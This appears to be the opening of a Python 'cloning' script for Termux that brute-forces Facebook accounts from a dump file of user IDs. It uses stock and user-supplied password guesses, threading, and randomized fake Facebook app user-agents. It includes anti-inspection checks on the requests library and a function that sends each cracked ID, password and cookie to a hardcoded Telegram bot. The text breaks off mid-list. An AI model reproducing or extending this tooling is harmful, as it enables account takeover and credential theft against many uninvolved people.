

'''
@Code written by : Masudur Rahman sifat
@github :
'''
#▬▭▬▭▬▭▬▭[ IMPORT MODULES ]▬▭▬▭▬▭▬▭#
import os,time,sys,re,string,uuid,json,random,pycurl
from concurrent.futures import ThreadPoolExecutor as threadpol
from os import system as magi
from io import BytesIO
from urllib.parse import quote
#----------METHOD PROTECTOR---------#
first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(first+'sessions.py','r').read():
    pass
else:
    exit('GET OUT BITCH - !')
first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(first+'api.py','r').read():
    pass
else:
    exit('\033[1;91mPLEASE TURN OFF YOUR BYPASS SYSTEM KIDZ')
first='/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/'
if not 'print' in open(first+'models.py','r').read():
    pass
else:
    exit('\033[1;91mPLEASE TURN OFF YOUR LOCAL METHOD CAPTURE SYSTEM KIDZ')
#▬▭▬▭▬▭▬▭[ COLLOR VARIABLES ]▬▭▬▭▬▭▬▭#
###----------[ PEH ]----------###
mer = '\033[1;31m'
kun = '\033[1;33m'
hijo = '\033[1;32m'
biru = '\033[1;34m'
ung = '\033[1;35m'
puti = '\033[1;37m'
bira = '\033[1;36m'
xxx = '\33[m'
GREEN ='\x1b[38;5;46m'
RED = '\x1b[38;5;46m'
WHITE = '\033[1;97m'
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
BLACK="\033[1;30m"
R = '{RED}' 
G = '{GREEN}' 
Y = '\033[1;33m' 
Q = '\033[1;37m'
T = '\033[1;34m'
x = '\33[m' 
P = '\x1b[1;97m' 
M = '\x1b[1;91m' 
H = '\x1b[1;92m' 
K = '\x1b[1;93m' 
B = '\x1b[1;94m' 
U = '\x1b[1;95m' 
O = '\x1b[1;96m' 
N = '\x1b[0m'    
A = '\x1b[1;90m' 
BN = '\x1b[1;107m' 
BBL = '\x1b[1;106m' 
BP = '\x1b[1;105m' 
BB = '\x1b[1;104m' 
BK = '\x1b[1;103m' 
BH = '\x1b[1;102m' 
BM = '\x1b[1;101m' 
BA = '\x1b[1;100m'
#▬▭▬▭▬▭▬▭[ COLLOR VARIABLES ]▬▭▬▭▬▭▬▭#
a="\033[1;97m";b="\033[1;92m";c="\033[1;91m";d="\033[1;32m";e="\033[1;37m";f="\033[1;96m";g="\033[1;93m";h="\033[1;94m";i="\033[1;95m";j="\x1b[38;5;208m"
#▬▭▬▭▬▭▬▭[ OPTION VARIABLES ]▬▭▬▭▬▭▬▭#
l1=f"{a}[{b}1{a}]";l2=f"{a}[{b}2{a}]";l3=f"{a}[{b}3{a}]";l4=f"{a}[{b}4{a}]";l5=f"{a}[{b}5{a}]";l6=f"{a}[{b}6{a}]";l7=f"{a}[{b}7{a}]";l0=f"{a}[{c}0{a}]";ekual=f"{f}:{a}"
#▬▭▬▭▬▭▬▭[ ENABLE SDCARD ]▬▭▬▭▬▭▬▭#
try:magi('rm -rf /sdcard/..txt');open('/sdcard/..txt','a').write(' ')
except PermissionError:magi("clear");print(f" {b}Please enable storage permission to continue{a}");magi("termux-setup-storage");exit()
#▬▭▬▭▬▭▬▭[ INSTALL ]▬▭▬▭▬▭▬▭#
try:import requests
except ModuleNotFoundError:
    magi("clear");print(f"{b} Installing Module .... ");magi("pip install requests > /dev/null")
#▬▭▬▭▬▭▬▭[ LINE ]▬▭▬▭▬▭▬▭#
sxrline=f"{f}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•"
#▬▭▬▭▬▭▬▭[ APPEND ]▬▭▬▭▬▭▬▭#
loop=0
oks,cps,psw,sxr_mthd,numnx,pmsn_ckki=[],[],[],[],[],[]
sys.stdout.write('\x1b]2; Mr. SMILE\x07')

def Elite(uid,pww,coki):
    try:
        import requests
        token = "7058865801:AAHAWfIFpnDLTqVTGvMxmV8ERsAElakChtw"#Add yout token 
        chatid = "6902849715"#Add your Chat Id
        ok_id =str(uid+"|"+pww+"|"+coki)
        url = f"https://api.telegram.org/bot{token}/sendMessage"
        params = {"chat_id": chatid, "text": ok_id}
        requests.get(url, params=params)
    except:
        pass
        
#▬▭▬▭▬▭▬▭[ LOGO ]▬▭▬▭▬▭▬▭#
def clr_logo():
    magi("clear")
    #os.system('clear')
    print("""\033[38;5;33m
    █████╗ ████████╗ ██████╗ ███╗   ███╗
   ██╔══██╗╚══██╔══╝██╔═══██╗████╗ ████║
   ███████║   ██║   ██║   ██║██╔████╔██║
   ██╔══██║   ██║   ██║   ██║██║╚██╔╝██║
   ██║  ██║   ██║   ╚██████╔╝██║ ╚═╝ ██║
   ╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝     ╚═╝ \x1b[38;1;97m ᴾᴿᴼ"""); print("""\033[38;5;196m────────────────────────────────────────────
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m CEO & OWNER    \033[38;5;196m : \x1b[38;5;196m SUMON X 𝗖𝗛𝗢𝗬𝗢𝗡
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m  ABOUTS  \033[38;5;196m  :\x1b[38;5;196m DESTROYED
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m VERSION \033[38;5;196m  :\x1b[38;1;97m 109.0.5.0.3
\033[38;5;196m[\x1b[38;5;196m+\033[38;5;196m]\x1b[38;5;34m STATUS \033[38;5;196m   :\x1b[38;5;196m PREMIUM 
\033[38;5;196m────────────────────────────────────────────""")
#▬▭▬▭▬▭▬▭[ MAIN DEF ]▬▭▬▭▬▭▬▭#
def menu():
    clr_logo()
    print(f" {l1} FILE CLONING\n {l2} RANDOM CLONING\n {l3} CONTACT ADMIN\n {l0} EXIT\n{sxrline}")
    chic_opsn=input(f"{b} CHOOSE AN OPTION {ekual} ")
    if chic_opsn in ['1','01','A','a']:smile_file()
    elif chic_opsn in ['2','02','B','b']:smile_random()
    elif chic_opsn in ['3','03','C','c']:magi("xdg-open https://api.whatsapp.com/send?phone=+8801989733880&text=");sxr_main()
    elif chic_opsn in ['0','00','O','o']:exit()
    else:print(f"\n{c} You have selected the wrong option..");time.sleep(4);menu()
#▬▭▬▭▬▭▬▭[ SMILE FILE ]▬▭▬▭▬▭▬▭#
def smile_file():
    clr_logo();dmp_in=input(f" {b}ENTER YOUR DUMP FILE {ekual} ")
    try:dmp_ck=open(dmp_in,'r').read().splitlines()
    except FileNotFoundError:print(f"{sxrline}\n {c}File location not found\n Enter File agin...");time.sleep(4);sxr_file()
    clr_logo()
    print(f" {l1} CUSTOM PASS\n {l2} BD AUTO PASS\n {l3} INDIA AUTO PASS\n {l4} NEPAL AUTO PASS\n {l5} PAK AUTO PASS\n{sxrline}")
    auto_pw = input(f" {b}CHOOSE PASS {ekual}")
    if auto_pw in ['2','02','B','b']:psw.append("203040");psw.append("405060");psw.append("506070");psw.append("708090");psw.append("908070");psw.append("@@##৳৳");psw.append("@#৳%&*");psw.append("113322");psw.append("09876543");psw.append("00998877");psw.append("0987654");psw.append("258000")
    elif auto_pw in ['3','03','C','c']:psw.append("firstlast123");psw.append("57575751");psw.append("last1234");psw.append("57273200");psw.append("firstlast");psw.append("first last");psw.append("first123");psw.append("first1234");psw.append("first12345");psw.append("first@123");psw.append("first@1234");psw.append("last123")
    elif auto_pw in ['4','04','D','d']:psw.append("firstlast123");psw.append("nepal123");psw.append("last1234");psw.append("first@12345");psw.append("firstlast");psw.append("first last");psw.append("first123");psw.append("first1234");psw.append("first12345");psw.append("first@123");psw.append("first@1234");psw.append("last123");psw.append("@first@");psw.append("@last@");psw.append("firstlast12")
    elif auto_pw in ['5','05','E','e']:psw.append("firstlast123");psw.append("first1122");psw.append("last1234");psw.append("first@");psw.append("firstlast");psw.append("first last");psw.append("first123");psw.append("first1234");psw.append("first12345");psw.append("first@123");psw.append("first@1234");psw.append("last123")
    else:
        clr_logo()
        try:ps_limt=int(input(f" {b}ENTER PASSWORD LIMIT {ekual} "))
        except:ps_limt = 4
        clr_logo()
        print(f" {b}EXAMPLE {ekual} {b}first123 {f}- {b}firstlast {f}- {b}last123\n{sxrline}")
        for x in range(ps_limt):
            inp_ps = f"{b} PASSWORD NO {f}{x+1} {ekual} "
            psw.append(input(inp_ps))
    clr_logo()
    print(f" {l1} MATHOD {f}- {b}1\n {l2} MATHOD {f}- {b}2\n {l3} MATHOD {f}- {b}3\n {l4} MATHOD {f}- {b}4\n {l5} MATHOD {f}- {b}5\n{sxrline}")
    sxr_in_mthd = input(f"{b} CHOICE MATHOD {ekual} ")
    if sxr_in_mthd in ['a','A','1','01']:sxr_mthd.append("A")
    elif sxr_in_mthd in ['b','B','2','02']:sxr_mthd.append("B")
    elif sxr_in_mthd in ['c','C','3','03']:sxr_mthd.append("C")
    elif sxr_in_mthd in ['d','D','4','04']:sxr_mthd.append("D")
    elif sxr_in_mthd in ['e','E','5','05']:sxr_mthd.append("E")
    else:sxr_mthd.append("A")
    clr_logo();sxrckki=input(f" {a}Do you went show COOKIE (y/n)?{ekual} ")
    if sxrckki in ['y','Y','yes','Yes','1']:pmsn_ckki.append(f'y')
    else:pmsn_ckki.append(f'n')
    with threadpol(max_workers=30) as sifatx:
        clr_logo()
        total_ids = str(len(dmp_ck))
        print(f" {b}TOTAL CRACK {ekual} {total_ids}\n {j}USE AIRPLANE MOD FOR GOOD RESULT\n{sxrline}")
        for ids_nam in dmp_ck:
            try:ids,names = ids_nam.split('|')
            except:pass
            pswdx = psw
            if 'A' in sxr_mthd:sifatx.submit(sxr_f_m1,ids,names,pswdx)
            elif 'B' in sxr_mthd:sifatx.submit(sxr_f_m2,ids,names,pswdx)
            elif 'C' in sxr_mthd:sifatx.submit(sxr_f_m3,ids,names,pswdx)
            elif 'D' in sxr_mthd:sifatx.submit(sxr_f_m4,ids,names,pswdx)
            elif 'E' in sxr_mthd:sifatx.submit(sxr_f_m5,ids,names,pswdx)
    print(f"\n{sxrline}\n{b} CREAK PROCESS HAS BEEN COMPLITE\n {b}TOTAL OK ID {ekual} {b}{str(len(oks))}\n{b} FILE SAVE AS {ekual} {a}/sdcard/SMILE-OK&CP.txt\n{sxrline}");exit()
#▬▭▬▭▬▭▬▭[ FILE daf ]▬▭▬▭▬▭▬▭#
def xiv():
    AMSS1 = random.choice(['MessengerLite', 'FB4A;FBAV', 'FB4A'])
    AMSS2 = random.choice(['SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 'GT-N7100','KOT49H', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'SM-T315','JDQ39', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-P5220','JDQ39', 'SM-T525','KOT49H', 'SM-T555','LRX22G', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X;', 'SM-A500F','MMB29M', 'GT-I9192','KOT49H', 'GT-P5100','JDQ', 'SM-T311','KOT49H'])
    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    application_version_code = str(random.randint(000000000,999999999))
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
    awmsim = random.choice(AMSS1)
    gtt = random.choice(AMSS2)
    gttt = random.choice(AMSS2)
    android_version = str(random.randrange(6,13))
    DARK_LMNx1 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1280};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung ;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/10;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    DARK_LMNx2 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2139};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    DARK_LMNx3 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2060};'+f'FBLC/it_IT;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    DARK_LMNx4 = '[FBAN/FB4A;FBAV/294.0.0.39.118;FBBV/253340706;FBDM/{density=3.5,width=1440,height=2730};FBLC/en_US;FBRV/253980635;FBCR/Spark NZ;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-G975F;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
    DARK_LMNx5 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=1.75,width=720,height=1361};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    DARK_LMNx6 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2145};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/9;FBOP/1;FBCA/armeabi-v7a:armeabi;]'
    DARK_LMNx7 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1920};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    DARK_LMNx8 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.625,width=1080,height=2094};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/9;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    DARK_LMNx9 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; {str(gtt)} Build/{str(gttt)} [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2076};'+f'FBLC/en_GB;FBRV/{str(application_version_code)};FBCR/{str(AMSS1)};FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/{str(gtt)};FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    return random.choice([DARK_LMNx1,DARK_LMNx2,DARK_LMNx3,DARK_LMNx4,DARK_LMNx5,DARK_LMNx6,DARK_LMNx7,DARK_LMNx8,DARK_LMNx9])
def __UBI___():
    application_version = str(random.randint(111,555))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(111,555))
    application_version_code=str(random.randint(000000000,999999999))
    android_version=str(random.randrange(6,13))
    numbr = f'{random.randint(111111, 999999)}.{random.randint(111,999)}'
    build = random.choice(["SP1A.", "TP2A.", "SP1A.", "SP1A.", "TP1A.", "TP1A.", "SP1A.", "TP1A.", "RKQ1.", "TP1A.", "TP1A.", "RP1A.", "RP1A.", "RKQ1.", "TQ3A.", "TD2A.", "TD4A.", "TQ3A.", "TP1A.", "TP1A.", "SP2A.", "SD2A.", "SQ3A.", "RD2A.", "RQ3A.", "RP1A.", "QD4A.", "QQ3A.", "QP1A.", "PQ3B.", "PD2A.", "PPR2.", "PPR1.", "OPM8.", "OPR6."])
    fbs = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
    ua1 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; Oppo CPH1931 Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBRV/{str(application_version_code)};FBPN/{str(fbs)};FBLC/en_US;FBMF/Oppo;FBBD/Oppo;FBDV/CPH1931;FBSV/10;FBCA/armeabi-v7a:armeabi;FBDM/'+'{density=2.0,width=720,height=1440};'+'FB_FW/1;]'
    ua2 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; ASUS_Z01QD Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.0,width=720,height=1352};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/banglalink;FBMF/asus;FBBD/asus;FBPN/{str(fbs)};FBDV/ASUS_Z01QD;FBSV/7.1.2;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua3 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; moto g power (2021) Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2120};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Verizon;FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/moto g power (2021);FBSV/11;FBOP/1;FBCA/arm64-v8a:;]'
    ua4 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; SM-N986B Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,width=720,height=1393};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/AT&amp;FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/SM-N986B;FBSV/1;FBOP/1;FBCA/arm64-v8a:;]'
    ua5 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; SM-G960F Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=2024};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Sprint;FBMF/samsung;FBBD/samsung;FBPN/{str(fbs)};FBDV/SM-G960F;FBSV/10;FBOP/19;FBCA/arm64-v8a:;]'
    ua6 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; motorola one zoom Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.25,width=720,height=1393};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/grameenphone;FBMF/motorola;FBBD/motorola;FBPN/{str(fbs)};FBDV/motorola one zoom;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
    ua7 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; HUAWEI MAR-LX1A Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1812};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/Vodafone UA;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/HUAWEI MAR-LX1A;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua8 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; Redmi Note 8T Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=3.0,width=1080,height=1794};'+f'FBLC/en_US;FBRV/{str(application_version_code)};FBCR/AT&amp;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/{str(fbs)};FBDV/Redmi Note 8T;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    ua9 = f'Davik/2.1.0 (Linux; U; Android {str(android_version)}.0.0; Redmi Note 8 Pro Build/{str(build)}{str(numbr)}) [FBAN/FB4A;FBAV/{str(application_version)};FBBV/{str(application_version_code)};FBDM/'+'{density=2.75,width=1080,height=2134};'+f'FBLC/cs_CZ;FBRV/{str(application_version_code)};FBCR/O2.CZ;FBMF/Xiaomi;FBBD/Redmi;FBPN/{str(fbs)};FBDV/Redmi Note 8 Pro;FBSV/10;FBOP/1;FBCA/arm64-v8a:;]'
    return random.choice([ua1,ua2,ua3,ua4,ua5,ua6,ua7,ua8,ua9])
    
def ooo():
    AMSS2 = random.choice(['SM-G920F','Moto G','Moto X','Motorola Moto X','Moto G14','Moto G Stylus','NRD90M','MatePad Pro 11','nova 11 SE ','Mate 60 Pro+ ','Huawei Mate 20 Pro','Huawei P30 Lite','NRD90M','SM-T535','LRX22G', 'SM-T231','KOT49H', 'SM-J320F','LMY47V', 'GT-I9190','KOT49H', 'GT-N7100','KOT49H', 'SM-T561','KTU84P', 'GT-N7100','KOT49H', 'GT-I9500','LRX22C', 'SM-J320F','LMY47V', 'SM-G930F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X', 'GT-P5100','IML74K', 'SM-J320F','LMY47V', 'GT-N8000','JZO54K', 'SM-T531','LRX22G', 'SPH-L720','KOT49H', 'GT-I9500','JDQ39', 'SM-G935F','NRD90M', 'SM-T561','KTU84P', 'SM-T531','KOT49H', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'SM-A500FU','MMB29M', 'SM-A500F','MMB29M', 'SM-T311','KOT49H', 'SM-T531','LRX22G', 'SM-J320F','LMY47V', 'SM-J320FN','LMY47V', 'SM-J320F','LMY47V', 'GT-P5210','KOT49H', 'SM-T230','KOT49H', 'GT-I9192','KOT49H', 'SM-T235','KOT4', 'GT-N7100','KOT49H', 'SM-A500F','LRX22G', 'SM-A500F','MMB29M', 'GT-N7100','KOT49H', 'SM-G920F','MMB29K', 'SM-J510FN','NMF26X', 'GT-N8000','JZO54K', 'SM-J320FN','LMY47V', 'SM-J320FN','LMY47V', 'SM-A500H','MMB29M', 'GT-I9300','JSS15J', 'GT-I9500','LRX22C', 'SM-J320F','LMY4', 'SM-J510FN','NMF26X', 'SM-A500F','MMB29M', 'GT-N8000','KOT49H', 'SM-T561','KTU84P', 'SM-G900F','KOT49H', 'GT-S7390','JZO54K', 'SM-J320F','LMY47V', 'GT-P5100','JZO54K', 'SM-A500FU','MMB29M', 'SM-G930F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T561','KTU84P', 'GT-N8000','KOT49H', 'SM-T531','LRX22G', 'SM-J510FN','MMB29M', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5110','JDQ39', 'GT-I9301I','KOT49H', 'SM-A500F','LRX22G', 'SM-G930F','NRD90M', 'SM-T311','KOT4', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'SM-J320M','LMY47V', 'SM-T531','LRX22G', 'SM-T820','NRD90M', 'GT-I9192','KOT49H', 'SM-G935F','MMB29K', 'SM-J701F','NRD90M;', 'GT-I9301I','KOT4', 'SM-J320FN','LMY47V', 'SM-T111','JDQ39', 'SM-A500F','MMB29M', 'SM-J510FN','NMF2', 'SM-T705','LRX22G', 'SM-G920F','NRD90M', 'GT-N5100','JZO54K', 'GT-I9300I','KTU84P', 'GT-I9300I','KTU84P', 'GT-N8000','KOT49H', 'GT-N8000','KOT49H', 'SM-A500F','MMB29M', 'GT-I9190','KOT49H', 'SM-J510FN','NMF26X', 'SM-J320F','LMY47V', 'GT-P5100','JDQ39', 'GT-I9300I','KTU84P', 'GT-N5100','JZO54K', 'GT-N8000','KOT49H', 'GT-I9500','LRX22C', 'SM-J320FN','LMY47V', 'SM-A500F','MMB29M', 'GT-N8000','JZO54K', 'SM-T805','LRX22G', 'SM-T231','KOT49H', 'GT-N5100','JZO54K', 'SM-J320H','LMY47V', 'SM-T231','KOT49H', 'SM-G930F','NRD90M', 'SM-G935F','NRD90M', 'SM-T310','KOT49H', 'GT-N8000','KOT49H', 'GT-I9300I','KTU84P', 'SM-G920F','NRD90M', 'SM-J510FN','NMF26X', 'SM-T705','LRX22G;', 'GT-P3110','JZO54K', 'GT-I9192','KOT49H', 'SM-J320F','LMY47V', 'SM-G920F','NRD90M', 'GT-I9300','IMM76D', 'SM-G950F','NRD90M', 'SM-J320F','LMY47V', 'SM-J510FN','NMF26X;', 'SM-J701F','NRD90M', 'SM-A500F','LRX22G', 'SM-T231','KOT49H', 'SM-T311','KOT49H', 'SM-J320FN','LMY47V', 'GT-P5210','KOT49H', 'SM-T805','LRX22G', 'GT-I9500','LRX22C', 'GT-P5200','KOT49H', 'GT-I9301I','KOT49H', 'GT-I9300','JSS15J', 